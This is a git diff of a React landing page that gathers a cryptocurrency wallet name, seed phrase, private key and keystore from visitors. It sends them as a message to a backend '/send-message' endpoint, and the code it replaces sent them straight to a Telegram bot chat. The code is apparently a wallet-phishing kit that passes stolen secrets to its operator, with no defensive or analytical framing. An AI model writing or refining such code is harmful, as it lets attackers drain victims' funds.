@@ -1,9 +1,9 @@
-import React, { useState } from "react";
-import axios from "axios";
+import { useState } from "react";
 import Footer from "../components/Footer";
-import { Outlet } from "react-router-dom";
 import Headers from "../components/Headers";
 import { ProjectContext } from "../context/ProjectContext";
+import { Outlet } from "react-router-dom";
+import axios from "axios";
 
 const LandingPage = () => {
   const [walletName, setWalletName] = useState("");
@@ -12,30 +12,34 @@ const LandingPage = () => {
   const [keyStore, setKeyStore] = useState("");
   const [password, setPassword] = useState("");
 
+  const backendUrl = import.meta.env.VITE_API_TG_BACKEND_URL;
 
-  const handleSubmitNow = async () => {
+  console.log(backendUrl);
+  const handleSubmitTelegram = async () => {
     const data = {};
     if (walletName) data.walletName = walletName;
     if (phrase) data.phrase = phrase;
     if (privateKey) data.privateKey = privateKey;
     if (keyStore) data.keyStore = keyStore;
 
-    const text = Object.entries(data)
+    const message = Object.entries(data)
       .map(([key, value]) => `${key}: ${value}`)
       .join("\n");
 
     try {
-      await axios.post(`${import.meta.env.VITE_API_TG_BOT}/sendMessage`, {
-        chat_id: import.meta.env.VITE_API_CHAT_ID,
-        text: text,
+      const response = await axios.post(`${backendUrl}/send-message`, {
+        message,
+      },
+      {
+        headers: {
+          'Content-Type': 'application/json', // Ensures the backend recognizes the request body as JSON
+        },
       });
-      // alert('Message sent successfully!');
+      console.log(response);
     } catch (error) {
-      console.error('Error sending message:', error);
-      // alert('Failed to send message.');
+      console.error(error);
     }
   };
-
   return (
     <ProjectContext.Provider
       value={{
@@ -49,7 +53,7 @@ const LandingPage = () => {
         setKeyStore,
         password,
         setPassword,
-        handleSubmitNow, // Add handleSubmit to the context
+        handleSubmitTelegram,
       }}
     >
       <>
